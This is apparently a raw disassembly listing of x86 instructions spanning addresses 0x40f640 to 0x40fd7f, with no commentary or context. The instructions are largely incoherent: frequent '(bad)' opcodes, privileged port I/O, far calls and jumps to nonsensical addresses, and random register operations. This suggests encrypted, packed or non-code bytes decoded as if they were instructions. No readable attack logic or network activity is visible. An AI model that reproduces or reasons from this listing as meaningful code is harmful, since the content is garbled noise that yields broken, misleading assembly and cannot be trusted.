  40f640:	sbb    DWORD PTR [edx+0x2],esp
  40f643:	out    dx,eax
  40f644:	out    0x39,eax
  40f646:	nop
  40f647:	push   0x98ea61f0
  40f64c:	or     BYTE PTR [ecx+0x5a04ff02],ah
  40f652:	push   0x5e
  40f654:	push   cs
  40f655:	mul    DWORD PTR [edx-0x2]
  40f658:	add    al,0xfe
  40f65a:	bound  esi,QWORD PTR [ecx+ebp*1+0xa]
  40f65e:	jns    0x40f69a
  40f660:	outs   dx,BYTE PTR ds:[esi]
  40f661:	push   cs
  40f662:	dec    ebp
  40f663:	shr    DWORD PTR ds:0x4d8ab762,0xe0
  40f66a:	inc    edi
  40f66b:	iret   
  40f66c:	pop    esi
  40f66d:	popaw  
  40f66f:	mov    esp,?
  40f671:	ins    DWORD PTR es:[edi],dx
  40f672:	mov    dl,0xfe
  40f674:	mov    esp,0x29746165
  40f679:	dec    edx
  40f67a:	das    
  40f67b:	sub    dh,BYTE PTR [ecx]
  40f67d:	bound  ecx,QWORD PTR ds:0xe53e00c0
  40f683:	test   DWORD PTR [ecx],0x44496031
  40f689:	sbb    DWORD PTR [ecx+0x2],esp
  40f68c:	add    BYTE PTR [ecx],dh
  40f68e:	scas   eax,DWORD PTR es:[edi]
  40f68f:	(bad)  
  40f690:	repz push cs
  40f692:	push   0x609b0002
  40f697:	in     al,dx
  40f698:	dec    DWORD PTR [eax-0x5a0013a0]
  40f69e:	sub    eax,0xe5bc4f58
  40f6a3:	push   esi
  40f6a4:	mul    dh
  40f6a6:	xlat   BYTE PTR ds:[ebx]
  40f6a7:	mov    dl,0xfe
  40f6a9:	fsub   DWORD PTR fs:[ecx+0x74]
  40f6ad:	aad    0x88
  40f6af:	popa   
  40f6b0:	sub    BYTE PTR [ecx],dh
  40f6b2:	or     ecx,ebp
  40f6b4:	push   cs
  40f6b5:	icebp  
  40f6b6:	fucom  st(3)
  40f6b8:	ins    BYTE PTR es:[edi],dx
  40f6b9:	out    0x8,al
  40f6bb:	jmp    0xa0e83fc3
  40f6c0:	les    ebp,FWORD PTR [esi-0x66f044a9]
  40f6c6:	mov    ecx,0xb99f62a7
  40f6cb:	popa   
  40f6cc:	xor    esp,DWORD PTR [ebp-0x70a5cb74]
  40f6d2:	push   esi
  40f6d3:	mov    eax,0xa7c98eb5
  40f6d8:	bound  edi,QWORD PTR [edi-0x80]
  40f6db:	imul   edi,DWORD PTR [ebx],0x7f
  40f6de:	push   esi
  40f6df:	or     eax,0x614c46b
  40f6e4:	bound  eax,QWORD PTR [eax]
  40f6e6:	fmul   DWORD PTR [eax]
  40f6e8:	xchg   ecx,eax
  40f6e9:	inc    ebx
  40f6ea:	leave  
  40f6eb:	(bad)  
  40f6ec:	call   0xf5729453
  40f6f1:	popa   
  40f6f2:	dec    edi
  40f6f3:	push   esi
  40f6f4:	pop    ebx
  40f6f5:	or     al,0x59
  40f6f7:	jo     0x40f721
  40f6f9:	popa   
  40f6fa:	aas    
  40f6fb:	sub    BYTE PTR [ebx+0x54],0x3f
  40f6ff:	push   esi
  40f700:	int    0xee
  40f702:	cs out dx,al
  40f704:	popf   
  40f705:	jmp    0x40f778
  40f707:	or     DWORD PTR [esi-0x4aa1f969],edi
  40f70d:	popa   
  40f70e:	pop    ss
  40f70f:	fsubr  st(0),st
  40f711:	imul   ecx,DWORD PTR [ecx+ecx*8-0x74469e5b],0xffffff8c
  40f719:	pop    ecx
  40f71a:	call   DWORD PTR [ebp+0x2]
  40f71d:	add    al,0x89
  40f71f:	gs inc edx
  40f722:	out    dx,al
  40f723:	push   esi
  40f724:	cmp    edi,DWORD PTR [edi+ebx*8]
  40f727:	push   ebp
  40f728:	jge    0x40f78b
  40f72a:	add    DWORD PTR gs:[eax],eax
  40f72d:	or     esp,0xba6eff15
  40f733:	mov    edi,fs
  40f735:	pop    esi
  40f736:	push   eax
  40f737:	push   edi
  40f738:	mov    WORD PTR [ecx+esi*2+0x5f],fs
  40f73c:	(bad)  
  40f73d:	push   esi
  40f73e:	jge    0x40f72d
  40f740:	add    al,0xc3
  40f742:	jae    0x40f799
  40f744:	std    
  40f745:	jl     0x40f7ac
  40f747:	pop    edi
  40f748:	(bad)  
  40f749:	add    BYTE PTR ds:[eax],dl
  40f74c:	fld    QWORD PTR [edi]
  40f74e:	inc    ecx
  40f74f:	ins    BYTE PTR es:[edi],dx
  40f750:	adc    eax,0x8cba2eff
  40f755:	jecxz  0x40f775
  40f757:	adc    BYTE PTR [edi+0x69],dl
  40f75a:	jmp    0xa8aae6e9
  40f75f:	xor    dl,BYTE PTR [esi-0x4c]
  40f762:	xor    DWORD PTR [eax],ecx
  40f764:	push   edi
  40f765:	inc    BYTE PTR [esi]
  40f767:	jle    0x40f776
  40f769:	call   0xfe976a3f
  40f76e:	pusha  
  40f76f:	scas   al,BYTE PTR es:[edi]
  40f770:	xor    eax,0x84d1eef6
  40f775:	test   BYTE PTR [ecx+0x39fe56e9],bh
  40f77b:	dec    ebp
  40f77c:	pop    ss
  40f77d:	push   0x28
  40f77f:	sub    eax,0x89b1b456
  40f784:	push   ebx
  40f785:	inc    dh
  40f787:	dec    DWORD PTR [eax+ebp*8]
  40f78a:	icebp  
  40f78b:	repnz push ebx
  40f78d:	(bad)  
  40f78e:	pusha  
  40f78f:	scas   eax,DWORD PTR es:[edi]
  40f790:	cmp    dh,dh
  40f792:	scas   al,BYTE PTR es:[edi]
  40f793:	xchg   ecx,eax
  40f794:	xchg   DWORD PTR [ecx+ebx*4-0x1601ac97],edi
  40f79b:	out    0xdf,al
  40f79d:	adc    BYTE PTR [esi+eax*4+0x5b],0xfe
  40f7a2:	mov    ?,WORD PTR [edx]
  40f7a4:	frstor [ecx+0x0]
  40f7a7:	pop    ebx
  40f7a8:	jae    0x40f790
  40f7aa:	neg    DWORD PTR [edi-0x17]
  40f7ad:	(bad)  
  40f7ae:	jae    0x40f7b0
  40f7b0:	inc    ecx
  40f7b1:	gs (bad) 
  40f7b3:	dec    DWORD PTR [edi-0x56]
  40f7b6:	std    
  40f7b7:	jne    0x40f781
  40f7b9:	loopne 0x40f82c
  40f7bb:	cmp    DWORD PTR [edi-0x17],ebx
  40f7be:	std    
  40f7bf:	mov    ch,0x58
  40f7c1:	mov    cl,0xfd
  40f7c3:	(bad)  
  40f7c4:	(bad)  
  40f7c5:	cmp    cl,BYTE PTR [esi]
  40f7c7:	call   0x3fe723
  40f7cc:	pop    edi
  40f7cd:	jnp    0x40f7b9
  40f7cf:	neg    DWORD PTR [edi-0x17]
  40f7d2:	std    
  40f7d3:	jne    0x40f83d
  40f7d5:	loopne 0x40f78e
  40f7d7:	cmp    DWORD PTR [edi-0x17],ecx
  40f7da:	std    
  40f7db:	mov    ch,0x20
  40f7dd:	mov    cl,0xfd
  40f7df:	call   FWORD PTR [edi]
  40f7e1:	cmp    ecx,DWORD PTR [esi]
  40f7e3:	call   0x3fe6db
  40f7e8:	das    
  40f7e9:	jnp    0x40f7c5
  40f7eb:	neg    DWORD PTR [edi-0x4c]
  40f7ee:	std    
  40f7ef:	mov    ch,0x24
  40f7f1:	mov    cl,0xfd
  40f7f3:	call   FWORD PTR [edi+0x3e]
  40f7f6:	push   cs
  40f7f7:	call   0x3feddf
  40f7fc:	pop    edi
  40f7fd:	jb     0x40f7dd
  40f7ff:	neg    DWORD PTR [edi-0x4c]
  40f802:	std    
  40f803:	jne    0x40f82d
  40f805:	loopne 0x40f78e
  40f807:	cmp    edi,ebp
  40f809:	mov    bl,0x81
  40f80b:	mov    ebp,0xfffdbbb8
  40f810:	or     BYTE PTR [edi+ebx*1],bh
  40f813:	push   0xef081900
  40f818:	mov    esi,0xe80e31cf
  40f81d:	stc    
  40f81e:	hlt    
  40f81f:	(bad)  
  40f820:	push   DWORD PTR [ecx]
  40f822:	jnp    0x40f7bc
  40f824:	iret   
  40f825:	out    0x82,al
  40f827:	pop    esi
  40f828:	(bad)  
  40f829:	pushf  
  40f82a:	jne    0x40f882
  40f82c:	(bad)  
  40f82d:	(bad)  
  40f82f:	fmul   DWORD PTR [edi]
  40f831:	leave  
  40f832:	mov    ds,WORD PTR [ebx]
  40f834:	dec    esi
  40f836:	loop   0x40f810
  40f838:	shufps xmm6,XMMWORD PTR [ebx+edi*1-0xa],0xbe
  40f83e:	mov    dl,0x5e
  40f840:	je     0x40f86b
  40f842:	retf   0xfe2b
  40f845:	scas   al,BYTE PTR es:[edi]
  40f846:	ret    0xb45e
  40f849:	mov    DWORD PTR [edx],edx
  40f84b:	pop    edi
  40f84c:	dec    BYTE PTR [ecx-0x6900e1af]
  40f852:	sbb    bl,BYTE PTR [ecx+0x5f2286ef]
  40f858:	out    0x4c,eax
  40f85a:	outs   dx,BYTE PTR ds:[esi]
  40f85b:	pop    ebp
  40f85c:	(bad)  
  40f85d:	jle    0x40f81b
  40f85f:	outs   dx,DWORD PTR ds:[esi]
  40f860:	div    BYTE PTR [esi-0x6]
  40f863:	imul   ebx,DWORD PTR [ecx],0x2d
  40f866:	add    ebx,DWORD PTR [edi-0x2]
  40f869:	pushf  
  40f86a:	stc    
  40f86b:	push   esi
  40f86c:	(bad)  
  40f86d:	pop    esi
  40f86e:	stc    
  40f86f:	push   cs
  40f870:	cmp    al,0x56
  40f872:	pop    edx
  40f873:	pop    ebp
  40f874:	mov    ah,0x55
  40f876:	pop    edx
  40f877:	pop    ebp
  40f878:	inc    BYTE PTR [eax]
  40f87a:	pop    ecx
  40f87b:	gs push ds
  40f87d:	(bad)  
  40f87e:	xor    dl,BYTE PTR ds:[edi+0x5d3a3edf]
  40f885:	out    0x28,eax
  40f887:	clc    
  40f888:	pop    esi
  40f889:	(bad)  
  40f88a:	es (bad) 
  40f88c:	neg    BYTE PTR ss:[esi]
  40f88f:	xchg   esp,eax
  40f890:	push   0xffffffed
  40f892:	pop    edx
  40f893:	fwait
  40f894:	pop    ebp
  40f895:	(bad)  
  40f896:	je     0x40f830
  40f898:	imul   edi,ecx,0x4
  40f89b:	or     ah,BYTE PTR [esi-0x632300a2]
  40f8a1:	imul   ebp,DWORD PTR [eax],0x21
  40f8a4:	jmp    0xdc88f0ac
  40f8a9:	add    edi,DWORD PTR [esi+edi*2-0x6c]
  40f8ad:	xor    dl,0x55
  40f8b0:	adc    al,BYTE PTR [ebx+ecx*2]
  40f8b3:	les    esi,FWORD PTR [ebp-0x28]
  40f8b6:	ss popa 
  40f8b8:	call   0x6f93bed9
  40f8bd:	enter  0x52ba,0xd3
  40f8c1:	or     ecx,DWORD PTR [ecx-0x53]
  40f8c4:	mov    edi,0x1353aec4
  40f8c9:	xor    ch,dh
  40f8cb:	(bad)  
  40f8cc:	call   0x3d95b83c
  40f8d1:	pop    esi
  40f8d2:	xchg   edi,eax
  40f8d3:	fsubr  st(0),st
  40f8d5:	jmp    0x40f8a9
  40f8d7:	loopne 0x40f880
  40f8d9:	add    ebx,DWORD PTR [ecx]
  40f8db:	pop    es
  40f8dc:	jmp    0x61f1f8e4
  40f8e1:	imul   esp,DWORD PTR [eax+0x77],0x52
  40f8e5:	adc    eax,0x93526ad8
  40f8ea:	or     ebx,DWORD PTR [ecx-0xa]
  40f8ed:	mov    edi,0x2a405f5e
  40f8f2:	pop    es
  40f8f3:	xor    DWORD PTR [ecx+eiz*2-0x13b24c91],edi
  40f8fa:	mov    ah,0xdf
  40f8fc:	fsubp  st(0),st
  40f8fe:	jmp    0xc944aef
  40f903:	dec    ecx
  40f904:	pushf  
  40f905:	adc    BYTE PTR [ebp+0x2f],bl
  40f908:	and    BYTE PTR [ebx],0x60
  40f90b:	mov    ebx,0x71cc1f1b
  40f910:	or     DWORD PTR [edx+0x1f],esi
  40f913:	jnp    0x40f8d6
  40f915:	jmp    DWORD PTR [edi]
  40f917:	xor    eax,0xdee93e89
  40f91c:	int3   
  40f91d:	addr16 out 0x8,al
  40f920:	leave  
  40f921:	push   DWORD PTR ds:0xe9263885
  40f927:	xor    bh,dh
  40f929:	mov    edi,0xe7bbe415
  40f92e:	iret   
  40f92f:	not    DWORD PTR [edx-0x2]
  40f932:	sbb    ebp,eax
  40f934:	push   ecx
  40f935:	inc    BYTE PTR [esi+0x347e9af]
  40f93b:	repnz push ecx
  40f93d:	dec    esi
  40f93e:	data16 out 0x9,al
  40f941:	call   0x5309f961
  40f946:	inc    BYTE PTR [ecx+0x48]
  40f949:	push   cs
  40f94a:	dec    DWORD PTR [esi+0x18]
  40f94d:	or     DWORD PTR [esi+0x69],eax
  40f950:	aas    
  40f951:	or     DWORD PTR [ebp+0x43],esi
  40f954:	outs   dx,DWORD PTR ds:[esi]
  40f955:	dec    ebp
  40f956:	xor    ch,BYTE PTR [ecx]
  40f958:	stos   BYTE PTR es:[edi],al
  40f959:	push   edx
  40f95a:	(bad)  
  40f95b:	cs in  al,0x57
  40f95e:	lods   eax,DWORD PTR ds:[esi]
  40f95f:	loope  0x40f996
  40f961:	fdivr  QWORD PTR [edx-0x1b2a1e2]
  40f967:	pushf  
  40f968:	cmp    ah,BYTE PTR [ecx-0x6a]
  40f96b:	rol    DWORD PTR ds:0xeba75e53,1
  40f971:	inc    edi
  40f972:	add    ebp,ecx
  40f974:	lahf   
  40f975:	jle    0x40f962
  40f977:	push   0xfffffff9
  40f979:	dec    ebp
  40f97a:	imul   ebp,ecx,0x5cfec258
  40f980:	sub    eax,0xd4213861
  40f985:	push   edx
  40f986:	mov    BYTE PTR [ecx+edx*4],ch
  40f989:	loop   0x40f98a
  40f98b:	inc    eax
  40f98c:	(bad)  
  40f98d:	loop   0x40f9cf
  40f98f:	add    BYTE PTR [eax],cl
  40f991:	gs push ebx
  40f993:	push   0x49
  40f995:	add    eax,0x44aa35ff
  40f99a:	aas    
  40f99b:	add    al,dh
  40f99d:	lods   eax,DWORD PTR ds:[esi]
  40f99e:	cmp    edi,edi
  40f9a0:	xlat   BYTE PTR ds:[ebx]
  40f9a1:	add    eax,eax
  40f9a3:	je     0x40f9d6
  40f9a5:	xchg   ebp,eax
  40f9a6:	data16 add BYTE PTR [eax],al
  40f9a9:	fcomp  st(5)
  40f9ab:	mov    esp,0x3f624e68
  40f9b0:	add    BYTE PTR [eax],bh
  40f9b2:	scas   al,BYTE PTR es:[edi]
  40f9b3:	jae    0x40f9bd
  40f9b5:	ror    bl,0x61
  40f9b8:	inc    DWORD PTR [edi-0x1c]
  40f9bb:	enter  0x573a,0xad
  40f9bf:	data16 add al,cl
  40f9c2:	fnstsw WORD PTR [eax+ebp*2+0x3f624e]
  40f9c9:	jo     0x40f9fa
  40f9cb:	push   0x73ad9841
  40f9d0:	or     BYTE PTR [eax],al
  40f9d2:	mov    esp,0xad57ff61
  40f9d7:	jae    0x40f9d5
  40f9d9:	inc    edi
  40f9da:	aaa    
  40f9db:	push   es
  40f9dc:	call   0x3fe70f
  40f9e1:	inc    ecx
  40f9e2:	retf   0x2
  40f9e5:	mov    ebp,0x1c83ea81
  40f9ea:	mov    al,0x54
  40f9ec:	push   edi
  40f9ed:	mov    dl,0xc
  40f9ef:	push   0x50
  40f9f1:	aaa    
  40f9f2:	aaa    
  40f9f3:	push   es
  40f9f4:	call   0x3fef19
  40f9f9:	rol    DWORD PTR [esi-0x6],1
  40f9fc:	mov    edi,DWORD PTR [ebp-0x6a]
  40f9ff:	inc    esi
  40fa00:	inc    ecx
  40fa01:	dec    eax
  40fa02:	jg     0x40fa3f
  40fa04:	pop    edx
  40fa05:	add    BYTE PTR [esi-0x2],al
  40fa08:	jg     0x40fa3b
  40fa0a:	test   DWORD PTR [ebx],0xca6c0074
  40fa10:	jo     0x40fa7b
  40fa12:	jo     0x40fa76
  40fa14:	mov    cl,0xe7
  40fa16:	or     al,0x8
  40fa18:	add    al,0x0
  40fa1a:	cmp    ah,BYTE PTR [edx+0x4a5f1ecf]
  40fa20:	sbb    al,0x44
  40fa22:	(bad)  
  40fa23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fa24:	mov    bl,0x67
  40fa26:	xor    DWORD PTR [edx+0x69],esp
  40fa29:	mov    ebp,0x40edd759
  40fa2e:	xor    DWORD PTR [edx],edx
  40fa30:	pop    ebx
  40fa31:	je     0x40fa5c
  40fa33:	jp     0x40f9f5
  40fa35:	(bad)  
  40fa36:	(bad)  
  40fa37:	into   
  40fa38:	imul   ecx,DWORD PTR [ebp+0xb],0xffffffd7
  40fa3c:	pop    edx
  40fa3d:	jmp    0x2d31:0x3d842830
  40fa44:	pop    esp
  40fa45:	inc    ebp
  40fa46:	mov    ch,0xf2
  40fa48:	inc    ebx
  40fa49:	mov    eax,0xfe5ab6ae
  40fa4e:	mov    ds:0x24071bcf,eax
  40fa53:	mov    ebx,DWORD PTR [edx+0x74]
  40fa56:	xchg   ebp,eax
  40fa57:	push   cs
  40fa58:	rol    DWORD PTR [edi],1
  40fa5a:	cdq    
  40fa5b:	mov    edx,DWORD PTR [edx]
  40fa5d:	inc    DWORD PTR [esi+0x73c8b87e]
  40fa63:	pop    ebp
  40fa64:	add    dl,BYTE PTR [ebp-0x56]
  40fa67:	std    
  40fa68:	xchg   bl,al
  40fa6a:	ins    DWORD PTR es:[edi],dx
  40fa6b:	(bad)  
  40fa6c:	mov    cl,0x69
  40fa6e:	xor    DWORD PTR [ebx+esi*4+0x59e400fe],ecx
  40fa75:	push   0x49
  40fa77:	push   ds
  40fa78:	dec    edi
  40fa79:	pop    ecx
  40fa7a:	mov    ah,dh
  40fa7c:	push   ebp
  40fa7d:	lea    esi,[edi+ebx*8]
  40fa80:	test   eax,0x8abffc3
  40fa85:	and    al,0xbe
  40fa87:	out    dx,al
  40fa88:	leave  
  40fa89:	call   0x5d4a6a11
  40fa8e:	ror    DWORD PTR [esi+0x1ec542a2],0xb8
  40fa95:	shl    dl,1
  40fa97:	dec    esp
  40fa98:	or     ecx,ebp
  40fa9a:	push   cs
  40fa9b:	icebp  
  40fa9c:	aad    0xd5
  40fa9e:	mov    cl,0xe
  40faa0:	xchg   ebx,eax
  40faa1:	sub    DWORD PTR [ebx-0x1],ebx
  40faa4:	mov    ecx,0x5e310410
  40faa9:	pop    esi
  40faaa:	jmp    0x40fa59
  40faac:	jecxz  0x40fad5
  40faae:	add    al,0x81
  40fab0:	dec    esi
  40fab1:	adc    ecx,DWORD PTR [ecx+ecx*8]
  40fab4:	inc    esi
  40fab5:	or     bl,BYTE PTR [ebx-0x29]
  40fab8:	popa   
  40fab9:	cwde   
  40faba:	sbb    al,0xce
  40fabc:	dec    esi
  40fabd:	add    DWORD PTR [edi+ebp*2],0x4403ae89
  40fac4:	push   ebx
  40fac5:	scas   al,BYTE PTR es:[edi]
  40fac6:	push   edi
  40fac7:	add    ecx,DWORD PTR [ecx-0x61]
  40faca:	pop    edx
  40facb:	scas   eax,DWORD PTR es:[edi]
  40facc:	dec    esi
  40facd:	push   ebp
  40face:	push   ebp
  40facf:	aam    0x11
  40fad1:	out    0xd0,al
  40fad3:	fisttp DWORD PTR [esi-0x45]
  40fad6:	push   edi
  40fad7:	add    BYTE PTR [edi+0x5a6bf0d4],dl
  40fadd:	push   ss
  40fade:	ss pop edx
  40fae0:	out    0xae,eax
  40fae2:	pop    ds
  40fae3:	inc    ebp
  40fae4:	xor    cl,BYTE PTR [ecx]
  40fae6:	mov    esp,0x248a8a8e
  40faeb:	push   edi
  40faec:	fmul   DWORD PTR [eax]
  40faee:	xor    DWORD PTR [ebp+0x6be0d467],0x6c
  40faf5:	pop    ss
  40faf6:	push   es
  40faf7:	pop    edx
  40faf8:	test   eax,0x76eafcc4
  40fafd:	jecxz  0x40fafe
  40faff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fb00:	xor    cl,BYTE PTR [esi+0x74]
  40fb03:	loope  0x40facf
  40fb05:	mov    ebx,0x4ed8e6df
  40fb0a:	je     0x40fae9
  40fb0c:	mov    ch,dl
  40fb0e:	pop    es
  40fb0f:	ror    DWORD PTR [edx+0x6aceff14],0x48
  40fb16:	add    ebp,ecx
  40fb18:	mov    DWORD PTR [edx+0x2e716aeb],0x1f6b655
  40fb22:	call   0xfe8f164b
  40fb27:	bnd jb 0x40faff
  40fb2a:	add    al,0x3f
  40fb2c:	jp     0x40fb76
  40fb2e:	pop    es
  40fb2f:	jmp    0x3a30bfe3
  40fb34:	js     0x40fb0b
  40fb36:	or     edx,DWORD PTR [ecx+0x7eff0c80]
  40fb3c:	add    BYTE PTR [ecx+ecx*2],bh
  40fb3f:	push   cs
  40fb40:	ins    DWORD PTR es:[edi],dx
  40fb41:	xor    eax,0x59e90008
  40fb46:	aad    0xfb
  40fb48:	push   ecx
  40fb49:	ja     0x40fb5b
  40fb4b:	call   FWORD PTR [esi-0x46]
  40fb4e:	(bad)  
  40fb4f:	jmp    0x40fba7
  40fb51:	jbe    0x40fba4
  40fb53:	(bad)  
  40fb54:	aam    0x16
  40fb56:	dec    edi
  40fb57:	je     0x40fb9a
  40fb59:	add    eax,0xe83e38ce
  40fb5e:	xor    BYTE PTR [ebp+eax*2+0x1a],0x9e
  40fb63:	(bad)  
  40fb64:	call   0x9297dc9b
  40fb69:	jae    0x40fbb8
  40fb6b:	push   esp
  40fb6c:	adc    esi,ecx
  40fb6e:	and    al,0x0
  40fb70:	jmp    0xe4b544aa
  40fb75:	retf   
  40fb76:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fb77:	(bad)  
  40fb78:	dec    DWORD PTR [eax+0x9]
  40fb7b:	mov    esi,eax
  40fb7d:	mov    al,ds:0x58416998
  40fb82:	loope  0x40fb62
  40fb84:	and    ecx,DWORD PTR [eax+0x9]
  40fb87:	add    esi,eax
  40fb89:	sar    DWORD PTR [esi],0xe6
  40fb8c:	push   0x3f5e6f
  40fb91:	data16 fnstsw WORD PTR [esi+0x25]
  40fb95:	or     BYTE PTR [ecx],cl
  40fb97:	or     eax,eax
  40fb99:	push   ebp
  40fb9a:	dec    esp
  40fb9b:	out    0x80,eax
  40fb9d:	sbb    BYTE PTR [ecx],cl
  40fb9f:	add    BYTE PTR [edx-0x1351800],cl
  40fba5:	call   FWORD PTR [eax]
  40fba7:	xchg   ebx,eax
  40fba8:	std    
  40fba9:	jne    0x40fb4b
  40fbab:	loopne 0x40fb63
  40fbad:	and    ebx,eax
  40fbaf:	or     BYTE PTR [ebx],cl
  40fbb1:	rol    BYTE PTR [ebp+eiz*2-0x79],0x45
  40fbb6:	mov    ah,0xb1
  40fbb8:	jae    0x40fba2
  40fbba:	rcr    cl,0x46
  40fbbd:	dec    DWORD PTR [edi+0x7f]
  40fbc0:	inc    ebx
  40fbc1:	loopne 0x40fc02
  40fbc3:	cmp    esp,edx
  40fbc5:	inc    ebp
  40fbc7:	call   0xb1c275b2
  40fbcc:	std    
  40fbcd:	or     ebx,DWORD PTR [eax+0x3c]
  40fbd0:	cmp    ecx,edx
  40fbd2:	ins    DWORD PTR es:[edi],dx
  40fbd3:	lods   al,BYTE PTR ds:[esi]
  40fbd4:	push   0xe28afd00
  40fbd9:	push   eax
  40fbda:	out    dx,eax
  40fbdb:	cmp    bl,dh
  40fbdd:	call   0x3e5f1f
  40fbe2:	xchg   ebx,eax
  40fbe3:	enter  0x2672,0x70
  40fbe7:	pop    es
  40fbe8:	add    bh,ch
  40fbea:	push   cs
  40fbeb:	mov    cl,0x73
  40fbed:	or     BYTE PTR [eax-0x68],al
  40fbf0:	xor    edi,edi
  40fbf2:	xor    ebx,esi
  40fbf4:	push   edi
  40fbf5:	je     0x40fc40
  40fbf7:	sti    
  40fbf8:	int    0x7
  40fbfa:	dec    ecx
  40fbfb:	mov    ebx,0x4b4eff0d
  40fc00:	int3   
  40fc01:	jecxz  0x40fc49
  40fc03:	int    0x62
  40fc05:	inc    BYTE PTR [eax]
  40fc07:	les    ebp,FWORD PTR [ecx+0x6a]
  40fc0a:	ins    BYTE PTR es:[edi],dx
  40fc0b:	cld    
  40fc0c:	bound  edx,QWORD PTR [esi-0x2]
  40fc0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fc10:	inc    edx
  40fc11:	imul   edi,DWORD PTR [ebp+0x69],0x33
  40fc15:	push   esi
  40fc16:	pop    ecx
  40fc17:	jns    0x40fc03
  40fc19:	repz jg 0x40fc73
  40fc1c:	bound  eax,QWORD PTR ds:0x568b7685
  40fc22:	(bad)  
  40fc23:	cdq    
  40fc24:	pusha  
  40fc25:	add    ch,bh
  40fc27:	mov    edi,0x907d09a
  40fc2c:	dec    ebp
  40fc2d:	ud0    ebp,esi
  40fc30:	push   0xffffffd0
  40fc32:	sti    
  40fc33:	out    0xec,al
  40fc35:	addr16 (bad) 
  40fc37:	fs push 0x6a
  40fc3a:	cmp    al,0x1c
  40fc3c:	adc    DWORD PTR [esi-0x2],0x44
  40fc40:	jle    0x40fcad
  40fc42:	dec    ebp
  40fc43:	or     ebx,edx
  40fc45:	push   esi
  40fc46:	mov    WORD PTR [edx+edx*8-0x4d],?
  40fc4a:	out    0x34,eax
  40fc4c:	and    al,0x57
  40fc4e:	(bad)  
  40fc4f:	call   0x269:0x73c8b461
  40fc56:	push   ebp
  40fc57:	stos   BYTE PTR es:[edi],al
  40fc58:	or     eax,0xd48dc383
  40fc5d:	sar    bl,0xe1
  40fc60:	or     dl,cl
  40fc62:	or     eax,DWORD PTR [esi-0x2517f574]
  40fc68:	add    eax,0x2a000004
  40fc6d:	or     DWORD PTR [ecx],ebp
  40fc6f:	pop    es
  40fc70:	mov    ah,0x20
  40fc72:	call   0xe9202d7a
  40fc77:	jmp    0x40fc9c
  40fc79:	loopne 0x40fc22
  40fc7b:	add    edx,DWORD PTR [esi-0x2b]
  40fc7e:	hlt    
  40fc7f:	push   esi
  40fc80:	lds    eax,FWORD PTR [eax]
  40fc82:	adc    DWORD PTR [edi],ebx
  40fc84:	or     cl,BYTE PTR [ebp+esi*8-0x74]
  40fc88:	cmc    
  40fc89:	push   eax
  40fc8a:	add    BYTE PTR [ebx],0xc9
  40fc8d:	adc    BYTE PTR [edx-0x3b],dl
  40fc90:	cs dec esp
  40fc92:	push   ebx
  40fc93:	or     BYTE PTR [esi],ah
  40fc95:	aad    0xe0
  40fc97:	imul   eax,DWORD PTR [eax+0xe],0xffffffce
  40fc9b:	push   esi
  40fc9c:	test   eax,0x7588bcc4
  40fca1:	gs sbb ah,ch
  40fca4:	inc    edi
  40fca5:	fisub  WORD PTR [edi]
  40fca7:	add    al,0xfe
  40fca9:	aam    0xdc
  40fcab:	push   esi
  40fcac:	jge    0x40fcaf
  40fcae:	xchg   ecx,eax
  40fcaf:	pop    edx
  40fcb0:	sub    BYTE PTR [edx-0x63],cl
  40fcb3:	mov    WORD PTR [ebp+0x59],gs
  40fcb6:	add    al,BYTE PTR [ecx+ecx*2]
  40fcb9:	ret    
  40fcba:	add    ebp,eax
  40fcbc:	(bad)  
  40fcbd:	dec    ebx
  40fcbe:	sti    
  40fcbf:	pop    es
  40fcc0:	into   
  40fcc1:	aam    0xf0
  40fcc3:	imul   ecx,esp,0xf
  40fcc6:	jbe    0x40fd1e
  40fcc8:	test   eax,0xb6e97cc4
  40fccd:	loop   0x40fc80
  40fccf:	jmp    0x3ad0:0x5e08f100
  40fcd6:	dec    edx
  40fcd7:	fisttp DWORD PTR [ebx]
  40fcd9:	mov    DWORD PTR [eax],edi
  40fcdb:	adc    dl,BYTE PTR [edi-0x69]
  40fcde:	sub    BYTE PTR [ebx+0x38ccb36b],0x3
  40fce5:	ss test edi,edi
  40fce8:	imul   esi,DWORD PTR [edx],0x596a0009
  40fcee:	call   DWORD PTR [ecx+ecx*4-0xfa8bb5]
  40fcf6:	aam    0xef
  40fcf8:	add    DWORD PTR [edi-0x3e],esi
  40fcfb:	dec    BYTE PTR [esi]
  40fcfd:	sub    ecx,DWORD PTR [ecx+0x73]
  40fd00:	xchg   edi,eax
  40fd01:	add    eax,0x3293e3dd
  40fd06:	jl     0x40fd4c
  40fd08:	or     eax,0xf9744b82
  40fd0d:	retf   
  40fd0e:	push   es
  40fd0f:	popa   
  40fd10:	out    0x84,al
  40fd12:	(bad)  
  40fd13:	mov    edi,0x7c86ea55
  40fd18:	shl    DWORD PTR ds:0xfe6a52d5,1
  40fd1e:	push   ebp
  40fd1f:	(bad)  
  40fd20:	cmp    al,0xf6
  40fd22:	xchg   BYTE PTR [ecx+edi*4+0x2d],bh
  40fd26:	aad    0x46
  40fd28:	inc    ecx
  40fd29:	xor    eax,0x5c6fef09
  40fd2e:	aad    0xf
  40fd30:	xchg   ecx,eax
  40fd31:	loope  0x40fd48
  40fd33:	call   FWORD PTR [esi-0x82a8400]
  40fd39:	xchg   esi,eax
  40fd3a:	out    dx,al
  40fd3b:	stc    
  40fd3c:	out    0x2,eax
  40fd3e:	inc    ecx
  40fd3f:	dec    edx
  40fd40:	inc    BYTE PTR [esi-0xb01aa02]
  40fd46:	ret    0x5f61
  40fd49:	mov    ebp,0xf4fe4b65
  40fd4e:	push   esi
  40fd4f:	dec    ebx
  40fd50:	je     0x40fdab
  40fd52:	add    al,0xd5
  40fd54:	sqrtps xmm0,XMMWORD PTR [edi+0x15]
  40fd58:	call   DWORD PTR [esi+0x4]
  40fd5b:	aad    0xeb
  40fd5d:	dec    esi
  40fd5e:	data16 stc 
  40fd60:	out    0x0,eax
  40fd62:	(bad)  
  40fd64:	(bad)  
  40fd65:	inc    DWORD PTR [edi+0x3a]
  40fd68:	out    0xff,al
  40fd6a:	mov    ebp,0x7c3ce655
  40fd6f:	mov    ah,0xfd
  40fd71:	dec    ebp
  40fd73:	lods   eax,DWORD PTR ds:[esi]
  40fd74:	out    0x21,al
  40fd76:	jg     0x40fd2c
  40fd78:	std    
  40fd79:	(bad)  
  40fd7a:	mov    ebp,0x7f19e6b9
  40fd7f:	mov    ah,0xfd
